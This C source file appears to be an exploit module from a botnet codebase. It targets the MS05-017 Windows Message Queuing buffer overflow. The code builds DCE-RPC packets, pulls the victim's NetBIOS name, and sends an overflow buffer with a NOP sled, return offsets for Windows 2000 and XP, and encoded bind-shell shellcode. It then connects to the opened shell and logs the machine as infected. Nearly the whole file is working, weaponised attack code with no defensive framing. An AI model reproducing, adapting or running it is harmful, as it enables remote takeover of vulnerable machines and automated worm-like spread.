#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MSMQ

#define NOP 0x90
#define _DCE_RPC_BIND 0x0B

typedef struct dce_rpc {
	unsigned char ver;
	unsigned char ver_minor;
	unsigned char pkt_type;
	unsigned char pkt_flags;
	unsigned long data_repres;
	unsigned short frag_len;
	unsigned short auth_len;
	unsigned long caller_id;
} DCE_RPC, *PDCE_RPC;


typedef struct dce_rpc_bind {
	unsigned short max_xmit;
	unsigned short max_recv;
	unsigned long asc_group;
	unsigned long num_con_items;
	unsigned short con_id;
	unsigned short num_trn_items;
	/* unsigned char *interface_uuid; */
	/* unsigned short interface_ver; */
	/* unsigned short interface_ver_min; */
	/* unsigned char *uuid; */
	/* unsigned long syntax_ver; */
} DCE_RPC_BIND, *PDCE_RPC_BIND;

unsigned char dce_rpc_header1[] =
"\x05\x00\x00\x01\x10\x00\x00\x00\x18\x04\x00\x00\x00\x00\x00\x00"
"\x00\x04\x00\x00\x00\x00\x09\x00\x01\x00\x00\x00\x01\x00\x00\x00"
"\x01\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00"
"\xE4\x07\x00\x00\x00\x00\x00\x00\xE4\x07\x00\x00"
"\x4F\x00\x53\x00\x3A\x00";
/* ... Remote NetBIOS name */

unsigned char tag_private[] =
/* \PRIVATE$\ */
"\x5C\x00"
"\x50\x00\x52\x00\x49\x00\x56\x00\x41\x00\x54\x00\x45\x00\x24\x00"
"\x5C\x00";

unsigned char dce_rpc_header2[] =
"\x05\x00\x00\x00\x10\x00\x00\x00\x18\x04\x00\x00\x00\x00\x00\x00"
"\x00\x04\x00\x00\x00\x00\x09\x00";

unsigned char dce_rpc_header3[] =
"\x05\x00\x00\x02\x10\x00\x00\x00\x04\x04\x00\x00\x00\x00\x00\x00"
"\xEC\x03\x00\x00\x00\x00\x09\x00";


unsigned char offsets[] =
/* entry point (jmp over) */
"\xEB\x08\x90\x90"
/* for Windows 2000 */
/* mqsvc.exe - pop reg; pop reg; retn; */
"\xE9\x14\x40\x00"
"\x90\x90\x90\x90\x90\x90\x90\x90"

/* entry point (jmp over) */
"\xEB\x08\x90\x90"
/* for Windows 2000 Server/AdvServer */
/* mqsvc.exe - pop reg; pop reg; retn; */
"\xE9\x14\x40\x00"
"\x90\x90\xEB\x1A\x41\x40\x68\x6F\x75\x73\x65\x6F\x66\x64\x61\x62"
"\x75\x73\x48\x41"
/* entry point (jmp over) */
"\xEB\x06\x90\x90"
/* for Windows XP */
/* mqsvc.exe - pop reg; pop reg; retn; */
"\x4d\x12\x00\x01"
"\x90\x90\x90\x90\x90\x90";


unsigned char bind_shellcode[] =
"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x19"
"\xf5\x04\x37\x83\xeb\xfc\xe2\xf4\xe5\x9f\xef\x7a\xf1\x0c\xfb\xc8"
"\xe6\x95\x8f\x5b\x3d\xd1\x8f\x72\x25\x7e\x78\x32\x61\xf4\xeb\xbc"
"\x56\xed\x8f\x68\x39\xf4\xef\x7e\x92\xc1\x8f\x36\xf7\xc4\xc4\xae"
"\xb5\x71\xc4\x43\x1e\x34\xce\x3a\x18\x37\xef\xc3\x22\xa1\x20\x1f"
"\x6c\x10\x8f\x68\x3d\xf4\xef\x51\x92\xf9\x4f\xbc\x46\xe9\x05\xdc"
"\x1a\xd9\x8f\xbe\x75\xd1\x18\x56\xda\xc4\xdf\x53\x92\xb6\x34\xbc"
"\x59\xf9\x8f\x47\x05\x58\x8f\x77\x11\xab\x6c\xb9\x57\xfb\xe8\x67"
"\xe6\x23\x62\x64\x7f\x9d\x37\x05\x71\x82\x77\x05\x46\xa1\xfb\xe7"
"\x71\x3e\xe9\xcb\x22\xa5\xfb\xe1\x46\x7c\xe1\x51\x98\x18\x0c\x35"
"\x4c\x9f\x06\xc8\xc9\x9d\xdd\x3e\xec\x58\x53\xc8\xcf\xa6\x57\x64"
"\x4a\xa6\x47\x64\x5a\xa6\xfb\xe7\x7f\x9d\x1a\x55\x7f\xa6\x8d\xd6"
"\x8c\x9d\xa0\x2d\x69\x32\x53\xc8\xcf\x9f\x14\x66\x4c\x0a\xd4\x5f"
"\xbd\x58\x2a\xde\x4e\x0a\xd2\x64\x4c\x0a\xd4\x5f\xfc\xbc\x82\x7e"
"\x4e\x0a\xd2\x67\x4d\xa1\x51\xc8\xc9\x66\x6c\xd0\x60\x33\x7d\x60"
"\xe6\x23\x51\xc8\xc9\x93\x6e\x53\x7f\x9d\x67\x5a\x90\x10\x6e\x67"
"\x40\xdc\xc8\xbe\xfe\x9f\x40\xbe\xfb\xc4\xc4\xc4\xb3\x0b\x46\x1a"
"\xe7\xb7\x28\xa4\x94\x8f\x3c\x9c\xb2\x5e\x6c\x45\xe7\x46\x12\xc8"
"\x6c\xb1\xfb\xe1\x42\xa2\x56\x66\x48\xa4\x6e\x36\x48\xa4\x51\x66"
"\xe6\x25\x6c\x9a\xc0\xf0\xca\x64\xe6\x23\x6e\xc8\xe6\xc2\xfb\xe7"
"\x92\xa2\xf8\xb4\xdd\x91\xfb\xe1\x4b\x0a\xd4\x5f\xf6\x3b\xe4\x57"
"\x4a\x0a\xd2\xc8\xc9\xf5\x04\x37";

#define SET_PORTBIND_PORT(buf, port) *(unsigned short *)(((buf)+186)) = (port)


int hex2raw(unsigned char *s, unsigned char *out) 
{
	unsigned long i, len, j = 0;
	unsigned long ret = 0;

	len = strlen((char*)s);
	for (i = 0; i < len; i+=2) {
		if ((s[i] >= 0x30) && (s[i] <= 0x39))
			j = s[i] - 0x30;
		else
			j = s[i] - 0x61 + 10;
		j *= 16;
		if ((s[i+1] >= 0x30) && (s[i+1] <= 0x39))
			j += s[i+1] - 0x30;
		else
			j += s[i+1] - 0x61 + 10;
		out[ret] = (unsigned char)j;
		ret++;
	}

	return ret;
}

void inverse(unsigned char *io, unsigned long len)
{
	unsigned long i;
	unsigned char c;

	for (i = 0; i < len/2; i++) {
		c = io[len-i-1];
		io[len-i-1] = io[i];
		io[i] = c;
	}
}


int encode_uuid(unsigned char *uuid, unsigned char *out)
{
	unsigned long i, len, ret;
	unsigned cnt = 0, ar = 0;
	unsigned char *ptr;

	ptr = uuid;
	len = strlen((char*)uuid);
	for (i = 0; i < len; i++) {
		if (uuid[i] == '-') {
			uuid[i] = '\0';
			if (ar < 3) {
				ret = hex2raw(ptr, out);
				inverse(out, ret);
				out += ret; cnt += ret;
			}
			else {
				ret = hex2raw(ptr, out);
				out += ret; cnt += ret;
			}
			ptr = uuid+i+1;
			ar++;
		}
	}
	out[len] = '\0';

	ret = hex2raw(ptr, out);
	out += ret; cnt += ret;

	return cnt;
}

unsigned char *dce_rpc_bind(
			 unsigned long cid,
			 unsigned char *uuid,
			 unsigned short ver,
			 unsigned long *pkt_len)
{
	unsigned char vuid[] = "8a885d04-1ceb-11c9-9fe8-08002b104860";
	unsigned char *pkt, *euuid, *tmp;
	unsigned long cnt;
	unsigned short ret;
	PDCE_RPC_BIND rpc_bind;
	PDCE_RPC rpc;

	pkt = (unsigned char *)calloc(2048, 1);
	euuid = (unsigned char *)calloc(strlen((char*)uuid)/2+2, 1);

	tmp = pkt;
	pkt += sizeof(DCE_RPC);
	rpc_bind = (PDCE_RPC_BIND)pkt;
	rpc_bind->max_xmit = 0x16D0;
	rpc_bind->max_recv = 0x16D0;
	rpc_bind->asc_group = 0;
	rpc_bind->num_con_items = 1;
	rpc_bind->con_id = 0;
	rpc_bind->num_trn_items = 1;

	pkt += sizeof(DCE_RPC_BIND);

	cnt = encode_uuid(uuid, pkt);
	pkt += cnt;
	memcpy(pkt, &ver, sizeof(short));
	pkt += sizeof(short);
	*pkt++ = 0; *pkt++ = 0;
	cnt = encode_uuid(vuid, pkt);
	pkt += cnt;
	*pkt++ = 2; *pkt++ = 0;

	ret = pkt - tmp;
	rpc = (PDCE_RPC)tmp;
	rpc->ver = 5;
	rpc->ver_minor = 0;
	rpc->pkt_type = _DCE_RPC_BIND;
	rpc->pkt_flags = 3;
	rpc->data_repres = 16;
	rpc->frag_len = ret + 2;
	rpc->auth_len = 0;
	rpc->caller_id = cid;

	*pkt_len = ret + 2;
	free(euuid);

	return tmp;
}

void convert_name(char *out, char *name)
{
	unsigned long len;

	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}

#pragma warning(disable:4309)
int getnbname(char *ip, char *out, int olen) {
	//ripped from http://packetstormsecurity.org/UNIX/scanners/nbtstat.c
	char nbtname[]= /* netbios name packet */
	{
		0x80,0xf0,0x00,0x10,0x00,0x01,0x00,0x00,
		0x00,0x00,0x00,0x00,0x20,0x43,0x4b,0x41,
		0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
		0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
		0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
		0x41,0x41,0x41,0x41,0x41,0x00,0x00,0x21,
		0x00,0x01
	};
	char temp[16];

	char recvbuf[256];
	char *ptr;

	int total;
	int j = 0;

	unsigned int nb_num;
	unsigned int nb_type;

	SOCKET s;
	SOCKADDR_IN server;

	if ((s = fsocket(PF_INET, SOCK_DGRAM, 17)) < 0) /* 17 = UDP */
		return 1;

	memset(recvbuf, 0, sizeof(recvbuf));

	memset(&server, 0, sizeof(server));

	server.sin_addr.s_addr = finet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = fhtons(137); /* netbios-ns */

	if (fsendto(s, nbtname, sizeof(nbtname), 0, (LPSOCKADDR)&server, sizeof(server)) == -1)
		return 1;
	else {
		if (frecv(s, recvbuf, sizeof(recvbuf) - 1, 0) == -1) return 1;

		ptr=recvbuf+57;
		total=*(ptr - 1); /* max names */

		while(ptr < recvbuf + sizeof(recvbuf)) {

			memset(temp, 0, sizeof(temp));
			strncpy(temp, ptr, 15); 	/* copies the name into temp */

			ptr+=15;
			nb_num  = *ptr; 
			nb_type = *(ptr + 1);
			ptr+=3;

			if (j==total) {  	/* max names reached */
				ptr-=19; 	/* sets the pointer to the mac_addres field */
				/*printf("\nMAC-addres = %02x-%02x-%02x-%02x-%02x-%02x\n\n",
					*(ptr + 1), *(ptr + 2), *(ptr + 3),
					*(ptr + 4), *(ptr + 5), *(ptr + 6));*/
				break;

			}

			/*NBNAME          <00> UNIQUE Workstation Service*/
			if (nb_num == 0x00 && nb_type <= 0x80) {
				for (unsigned int i=0; i < strlen(temp); i++) /* replaces weird chars with dots */ 
					if (temp[i] < 31 || temp[i] > 126) temp[i] = '.';
				break;
			}
			j++;

		}
	}
	fclosesocket(s);
	if (strncpy(out, temp, olen) != NULL) return 0;
	else return 1;
}
#pragma warning(default:4309)

bool msmq(EXINFO exinfo)
{

	unsigned char endp[] = "fdb3a030-065f-11d1-bb9b-00a024ea5525";
	unsigned char *packet;
	unsigned short bindport;
	int len, cnt;
	char recvbuf[4096];
	char *buff, *ptr;


	/*printf("\n (MS05-017) Message Queuing Buffer Overflow Vulnerability\n\n");
	printf("\t Copyright (c) 2004-2005 .: houseofdabus :.\n\n\n");
	printf("\nMSMQ ports: 2103, 2105, 2107\n");*/

	char *nbname=(char*)malloc(16);
	if (getnbname(exinfo.ip, nbname, 16) == 1) return false;

	SOCKET sockfd = fsocket(AF_INET, SOCK_STREAM, 0);

	SOCKADDR_IN addr;
	addr.sin_family = AF_INET;
	addr.sin_port = fhtons(exinfo.port);
	addr.sin_addr.s_addr = finet_addr(exinfo.ip); 
	memset(&(addr.sin_zero), '\0', 8);

	if (fconnect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0)
		return false;

	packet = dce_rpc_bind(0, endp, 1, (unsigned long*)&cnt);

	if (fsend(sockfd, (char*)packet, cnt, 0) == -1)
		return false;

	len = frecv(sockfd, recvbuf, 4096, 0);
	if (len <= 0)
		return false;
	free(packet);

	buff = (char *) malloc(4172);
	memset(buff, NOP, 4172);

	ptr = buff;
	memcpy(ptr, dce_rpc_header1, sizeof(dce_rpc_header1)-1);
	ptr += sizeof(dce_rpc_header1)-1;

	// Remote NetBIOS name
	convert_name(ptr, nbname);
	ptr += strlen(nbname)*2;

	memcpy(ptr, tag_private, sizeof(tag_private)-1);
	ptr += sizeof(tag_private)-1;

	memcpy(buff+1048, dce_rpc_header2, sizeof(dce_rpc_header2)-1);
	memcpy(buff+1048*2, dce_rpc_header2, sizeof(dce_rpc_header2)-1);
	memcpy(buff+1048*3, dce_rpc_header3, sizeof(dce_rpc_header3)-1);

	// offsets
	ptr += 346;
	memcpy(ptr, offsets, sizeof(offsets)-1);
	ptr += sizeof(offsets)-1;

	// shellcode
	bindport = randnum(65534);
	bindport ^= 0x0437;
	SET_PORTBIND_PORT(bind_shellcode, fhtons(bindport));
	memcpy(ptr, bind_shellcode, sizeof(bind_shellcode)-1);
	bindport ^= 0x0437;

	buff[4170] = '\0';
	buff[4171] = '\0';

	if (fsend(sockfd, buff, 4172, 0) == -1)
		return false;

	free(buff);
	free(nbname);

	ConnectShell(exinfo, bindport);

	return (AddEx(exinfo,true));
}

#endif